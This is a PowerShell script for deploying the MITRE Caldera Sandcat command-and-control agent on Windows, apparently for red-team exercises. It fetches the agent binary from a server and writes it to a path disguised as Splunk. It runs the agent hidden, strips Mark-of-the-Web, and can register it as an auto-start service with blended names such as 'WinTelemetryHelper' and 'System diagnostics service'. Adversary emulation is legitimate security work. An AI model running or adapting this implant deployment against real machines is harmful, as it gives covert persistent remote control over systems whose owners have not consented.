#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Deploys and launches the MITRE Caldera Sandcat agent on a Windows machine.

.DESCRIPTION
    Downloads the Sandcat agent binary from a running Caldera server using
    WebClient.DownloadData() + [io.file]::WriteAllBytes(), kills any existing
    instance at the drop path, then launches the agent via Start-Process with
    the correct argument string. Optionally installs as a persistent Windows
    service via NSSM or sc.exe.

.PARAMETER CalderaServer
    Base URL of the Caldera server including scheme and port.
    Example: http://192.168.10.108:8888

.PARAMETER Group
    Agent group to enrol into. Defaults to "red".

.PARAMETER C2Channel
    Contact channel for beacon traffic: http, udp, tcp, websocket.
    Defaults to "http".

.PARAMETER AgentPath
    Full path where the agent binary is written on disk.
    Defaults to C:\Users\Public\splunkd.exe

.PARAMETER InstallAsService
    If specified, installs the agent as a persistent auto-start Windows service.

.PARAMETER ServiceName
    Windows service name used when -InstallAsService is set.
    Defaults to "CalderaSandcat".

.PARAMETER Proxy
    Optional HTTP proxy for download and beacon traffic.
    Example: http://proxy.corp.local:8080

.PARAMETER ForceRedownload
    If specified, deletes an existing binary at AgentPath and re-downloads
    even if the file already exists.

.EXAMPLE
    # Basic deployment - mirrors the working one-liner
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888"

.EXAMPLE
    # Custom group, WebSocket C2, custom drop path
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888" `
        -Group "blue" -C2Channel "websocket" `
        -AgentPath "C:\ProgramData\Microsoft\splunkd.exe"

.EXAMPLE
    # Persistent service with blended name
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.108:8888" `
        -Group "red" -InstallAsService -ServiceName "WinTelemetryHelper"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidatePattern('^https?://')]
    [string]$CalderaServer,

    [Parameter(Mandatory = $false)]
    [string]$Group = "red",

    [Parameter(Mandatory = $false)]
    [ValidateSet("http", "udp", "tcp", "websocket")]
    [string]$C2Channel = "http",

    [Parameter(Mandatory = $false)]
    [string]$AgentPath = "C:\Users\Public\splunkd.exe",

    [Parameter(Mandatory = $false)]
    [switch]$InstallAsService,

    [Parameter(Mandatory = $false)]
    [string]$ServiceName = "CalderaSandcat",

    [Parameter(Mandatory = $false)]
    [string]$Proxy = "",

    [Parameter(Mandatory = $false)]
    [switch]$ForceRedownload
)

# --------------------------------------------------------------
# Helper: timestamped coloured output
# --------------------------------------------------------------
function Write-Status {
    param([string]$Message, [string]$Level = "INFO")
    $colors = @{ INFO = "Cyan"; OK = "Green"; WARN = "Yellow"; ERROR = "Red" }
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$ts] [$Level] $Message" -ForegroundColor $colors[$Level]
}

# --------------------------------------------------------------
# Helper: download and install NSSM if not already present
#         NSSM is required for reliable service installation
#         because Sandcat is a foreground app, not a native service
# --------------------------------------------------------------
function Install-NSSM {
    # Check if NSSM is already on PATH
    $existing = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Status "NSSM already available at: $($existing.Source)" -Level "OK"
        return $true
    }

    Write-Status "NSSM not found - downloading and installing..."

    try {
        $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"

        # Use C:\Windows\Temp instead of $env:TEMP to avoid user profile path issues
        $tempDir = "C:\Windows\Temp"
        if (-not (Test-Path $tempDir)) {
            $tempDir = [System.IO.Path]::GetTempPath().TrimEnd('\')
        }

        $nssmZip = Join-Path $tempDir "nssm-2.24.zip"
        $nssmExtractDir = Join-Path $tempDir "nssm-extract"
        $nssmInstallDir = "C:\Tools\nssm"

        # Clean up any previous failed attempts
        if (Test-Path $nssmExtractDir) {
            Remove-Item -Recurse -Force $nssmExtractDir -ErrorAction SilentlyContinue
        }

        # Download NSSM
        Write-Status "Downloading NSSM from nssm.cc..."
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $nssmUrl -OutFile $nssmZip -UseBasicParsing -ErrorAction Stop

        # Verify download
        if (-not (Test-Path $nssmZip)) {
            Write-Status "Download failed - ZIP file not found" -Level "ERROR"
            return $false
        }
        $zipSize = (Get-Item $nssmZip).Length
        Write-Status "Downloaded $zipSize bytes"

        # Extract using .NET ZipFile (more reliable than Expand-Archive)
        Write-Status "Extracting NSSM..."
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($nssmZip, $nssmExtractDir)

        # Find nssm.exe in the extracted files (handle any directory structure)
        $arch = if ([Environment]::Is64BitOperatingSystem) { "win64" } else { "win32" }
        $nssmExe = Get-ChildItem -Path $nssmExtractDir -Recurse -Filter "nssm.exe" |
            Where-Object { $_.DirectoryName -like "*$arch*" } |
            Select-Object -First 1 -ExpandProperty FullName

        if (-not $nssmExe) {
            Write-Status "NSSM binary not found after extraction" -Level "ERROR"
            Write-Status "Looking for any nssm.exe in extracted files..." -Level "INFO"
            $anyNssm = Get-ChildItem -Path $nssmExtractDir -Recurse -Filter "nssm.exe"
            if ($anyNssm) {
                Write-Status "Found: $($anyNssm.FullName)" -Level "INFO"
                $nssmExe = $anyNssm[0].FullName
            } else {
                Write-Status "No nssm.exe found anywhere in the ZIP" -Level "ERROR"
                return $false
            }
        }

        Write-Status "Found NSSM binary at: $nssmExe"

        # Install to C:\Tools\nssm
        Write-Status "Installing NSSM to $nssmInstallDir..."
        if (-not (Test-Path $nssmInstallDir)) {
            New-Item -ItemType Directory -Path $nssmInstallDir -Force | Out-Null
        }

        Copy-Item -Path $nssmExe -Destination "$nssmInstallDir\nssm.exe" -Force

        # Add to system PATH permanently
        $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
        if ($currentPath -notlike "*$nssmInstallDir*") {
            Write-Status "Adding NSSM to system PATH..."
            $newPath = $currentPath + ";" + $nssmInstallDir
            [Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
        }

        # Add to current session PATH
        $env:PATH += ";$nssmInstallDir"

        # Cleanup
        Remove-Item -Force $nssmZip -ErrorAction SilentlyContinue
        Remove-Item -Recurse -Force $nssmExtractDir -ErrorAction SilentlyContinue

        # Verify installation
        $installed = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
        if ($installed) {
            Write-Status "NSSM installed successfully to: $nssmInstallDir" -Level "OK"
            $version = & nssm.exe version 2>&1
            Write-Status "NSSM version: $version" -Level "OK"
            return $true
        } else {
            Write-Status "NSSM binary copied but not found on PATH" -Level "WARN"
            Write-Status "Restart PowerShell or run: `$env:PATH += ';$nssmInstallDir'" -Level "INFO"
            # Return true anyway since the binary is installed, just needs PATH refresh
            return $true
        }
    }
    catch {
        Write-Status "Failed to install NSSM: $_" -Level "ERROR"
        Write-Status "Manual installation: Download from https://nssm.cc, extract, and run:" -Level "INFO"
        Write-Status "  Copy-Item nssm.exe C:\Tools\nssm\nssm.exe" -Level "INFO"
        Write-Status "  `$env:PATH += ';C:\Tools\nssm'" -Level "INFO"
        return $false
    }
}

# --------------------------------------------------------------
# Helper: kill any existing process running from AgentPath,
#         then delete the file - mirrors the one-liner's pattern
# --------------------------------------------------------------
function Remove-ExistingAgent {
    param([string]$Path)

    # Kill by module path (exact match - same technique as the one-liner)
    $running = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Modules.FileName -like $Path }
    if ($running) {
        Write-Status "Stopping $($running.Count) existing agent process(es) at '$Path'" -Level "WARN"
        $running | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }

    # Remove the binary so WriteAllBytes can write cleanly
    if (Test-Path $Path) {
        Remove-Item -Force $Path -ErrorAction Ignore
        Write-Status "Removed existing binary at '$Path'" -Level "WARN"
    }
}

# --------------------------------------------------------------
# Helper: download binary via DownloadData + WriteAllBytes
#         This is the method Caldera's own one-liner uses and
#         is required - DownloadFile does not work with this endpoint
# --------------------------------------------------------------
function Get-SandcatBinary {
    param([string]$Server, [string]$Destination, [string]$Proxy)

    $url = "$Server/file/download"
    Write-Status "Downloading agent from $url"

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("platform", "windows")
        $wc.Headers.Add("file", "sandcat.go")

        if ($Proxy) {
            $wc.Proxy = New-Object System.Net.WebProxy($Proxy, $true)
            Write-Status "Routing download through proxy: $Proxy"
        }

        # DownloadData returns a raw byte array - required by this endpoint
        $data = $wc.DownloadData($url)

        if (-not $data -or $data.Length -eq 0) {
            Write-Status "Server returned empty response - check Sandcat plugin is loaded on the server" -Level "ERROR"
            return $false
        }

        # Ensure destination directory exists
        $dir = Split-Path $Destination -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }

        [System.IO.File]::WriteAllBytes($Destination, $data)

        $size = (Get-Item $Destination).Length
        Write-Status "Agent written to '$Destination' ($size bytes)" -Level "OK"
        return $true
    }
    catch {
        Write-Status "Download failed: $_" -Level "ERROR"
        return $false
    }
}

# --------------------------------------------------------------
# Helper: launch agent as a hidden background process
#         Uses Start-Process -ArgumentList, which correctly passes
#         the argument string to the Go binary
# --------------------------------------------------------------
function Start-SandcatProcess {
    param(
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    # Build argument string - matches Caldera one-liner format exactly
    $argList = "-server $Server -group $Group"
    if ($C2 -ne "http") {
        $argList += " -contact $C2"
    }

    Write-Status "Launching agent..."
    Write-Status "  Binary    : $AgentBin"
    Write-Status "  Server    : $Server"
    Write-Status "  Group     : $Group"
    Write-Status "  C2        : $C2"
    Write-Status "  Arguments : $argList"

    try {
        $proc = Start-Process `
            -FilePath  $AgentBin `
            -ArgumentList $argList `
            -WindowStyle Hidden `
            -PassThru `
            -ErrorAction Stop

        Start-Sleep -Seconds 2

        # Confirm process is still alive after launch
        $alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($alive) {
            Write-Status "Agent running with PID $($proc.Id)" -Level "OK"
        } else {
            Write-Status "Process launched but exited immediately - check binary integrity and server connectivity" -Level "WARN"
        }
        return $proc
    }
    catch {
        Write-Status "Failed to start agent: $_" -Level "ERROR"
        return $null
    }
}

# --------------------------------------------------------------
# Helper: install agent as a persistent Windows service
#         Tries NSSM first, falls back to sc.exe + batch wrapper
# --------------------------------------------------------------
function Install-SandcatService {
    param(
        [string]$Name,
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    $argList = "-server $Server -group $Group"
    if ($C2 -ne "http") { $argList += " -contact $C2" }

    # -- Option A: NSSM (recommended) --------------------------
    $nssm = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
    if ($nssm) {
        Write-Status "NSSM found - installing service via NSSM"
        & nssm.exe install    $Name $AgentBin $argList
        & nssm.exe set        $Name Start SERVICE_AUTO_START
        & nssm.exe set        $Name AppRestartDelay 5000
        & nssm.exe start      $Name
        Write-Status "Service '$Name' installed and started via NSSM" -Level "OK"
        return
    }

    # -- Option B: sc.exe service wrapper ----------------------
    # For paths without spaces, we can invoke the binary directly as a service.
    # For paths with spaces, we need a batch wrapper.
    Write-Status "NSSM not found - using sc.exe" -Level "WARN"

    $hasSpaces = $AgentBin -match '\s'

    if (-not $hasSpaces) {
        # Direct binary invocation - cleaner and more reliable
        Write-Status "Path has no spaces - registering binary directly as service"
        $binPath = "$AgentBin $argList"

        $createResult = sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Status "sc.exe create failed: $createResult" -Level "ERROR"
            return
        }

    } else {
        # Batch wrapper required for paths with spaces
        Write-Status "Path contains spaces - using batch wrapper"
        $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
        $line1 = '@echo off'
        $line2 = ':loop'
        $line3 = '"' + $AgentBin + '" ' + $argList
        $line4 = 'timeout /t 10 /nobreak >nul'
        $line5 = 'goto loop'
        $wrapperContent = $line1 + "`r`n" + $line2 + "`r`n" + $line3 + "`r`n" + $line4 + "`r`n" + $line5
        Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII
        Write-Status "Wrapper written to: $wrapperPath"

        $binPath = "cmd.exe /c \`"$wrapperPath\`""

        $createResult = sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Status "sc.exe create failed: $createResult" -Level "ERROR"
            return
        }
    }

    sc.exe description $Name "System diagnostics service" | Out-Null

    Write-Status "Starting service '$Name'..."
    $startResult = sc.exe start $Name 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Status "sc.exe start failed (exit $LASTEXITCODE)" -Level "ERROR"
        Write-Status "$startResult" -Level "ERROR"
        Write-Status "Common causes:" -Level "INFO"
        Write-Status "  - Agent binary missing or corrupted" -Level "INFO"
        Write-Status "  - Server URL unreachable from service account (LocalSystem)" -Level "INFO"
        Write-Status "  - Antivirus blocking execution" -Level "INFO"
        if ($hasSpaces) {
            Write-Status "  - Try manually: $wrapperPath" -Level "INFO"
        } else {
            Write-Status "  - Try manually: $AgentBin $argList" -Level "INFO"
        }
        return
    }

    Start-Sleep -Seconds 3
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") {
        Write-Status "Service '$Name' is running" -Level "OK"
    } else {
        $status = if ($svc) { $svc.Status } else { "NOT FOUND" }
        Write-Status "Service created but status is: $status" -Level "WARN"
        Write-Status "Check: Get-EventLog -LogName System -Source 'Service Control Manager' -Newest 10" -Level "INFO"
    }
}

# --------------------------------------------------------------
# Helper: stop and remove a service before reinstalling
# --------------------------------------------------------------
function Remove-ExistingService {
    param([string]$Name)
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Status "Removing existing service '$Name'" -Level "WARN"
        Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
        sc.exe delete $Name | Out-Null
        Start-Sleep -Seconds 2
    }
}

# ==============================================================
#  MAIN
# ==============================================================

Write-Status "==============================================="
Write-Status " MITRE Caldera - Sandcat Agent Deployer"
Write-Status " Server  : $CalderaServer"
Write-Status " Group   : $Group"
Write-Status " C2      : $C2Channel"
Write-Status " Path    : $AgentPath"
Write-Status "==============================================="

# 0. If service mode is requested, ensure NSSM is available
if ($InstallAsService) {
    Write-Status "Service installation requested - checking for NSSM..."
    $nssmOk = Install-NSSM
    if (-not $nssmOk) {
        Write-Status "Proceeding without NSSM - will use sc.exe fallback (less reliable)" -Level "WARN"
    }
}

# 1. Confirm server is reachable
Write-Status "Checking server connectivity..."
try {
    $ping = Invoke-WebRequest -Uri "$CalderaServer/ping" `
        -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    Write-Status "Server reachable (HTTP $($ping.StatusCode))" -Level "OK"
}
catch {
    Write-Status "Cannot reach '$CalderaServer' - verify the server is running and the port is accessible" -Level "ERROR"
    exit 1
}

# 2. Kill existing instance and re-download, or skip if binary exists
if ((Test-Path $AgentPath) -and -not $ForceRedownload) {
    Write-Status "Binary already present at '$AgentPath' - skipping download (use -ForceRedownload to override)" -Level "WARN"
} else {
    # Always kill and clean before writing to avoid file-lock errors
    Remove-ExistingAgent -Path $AgentPath

    $ok = Get-SandcatBinary -Server $CalderaServer -Destination $AgentPath -Proxy $Proxy
    if (-not $ok) {
        Write-Status "Aborting - binary download failed" -Level "ERROR"
        exit 1
    }
}

# 3. Strip Mark-of-the-Web alternate data stream
Unblock-File -Path $AgentPath -ErrorAction SilentlyContinue

# 4a. Persistent service mode
if ($InstallAsService) {
    Remove-ExistingService -Name $ServiceName
    Install-SandcatService `
        -Name     $ServiceName `
        -AgentBin $AgentPath `
        -Server   $CalderaServer `
        -Group    $Group `
        -C2       $C2Channel

# 4b. One-shot process mode (default)
} else {
    # Kill any stale instance that survived step 2 (e.g. if -ForceRedownload was not set)
    $stale = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Modules.FileName -like $AgentPath }
    if ($stale) {
        Write-Status "Stopping stale agent process before relaunch" -Level "WARN"
        $stale | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }

    $proc = Start-SandcatProcess `
        -AgentBin $AgentPath `
        -Server   $CalderaServer `
        -Group    $Group `
        -C2       $C2Channel

    if ($proc) {
        Write-Status "Agent deployed. Check the Caldera UI under Agents." -Level "OK"
        Write-Status "To stop: Stop-Process -Id $($proc.Id) -Force" -Level "INFO"
    }
}

Write-Status "Done." -Level "OK"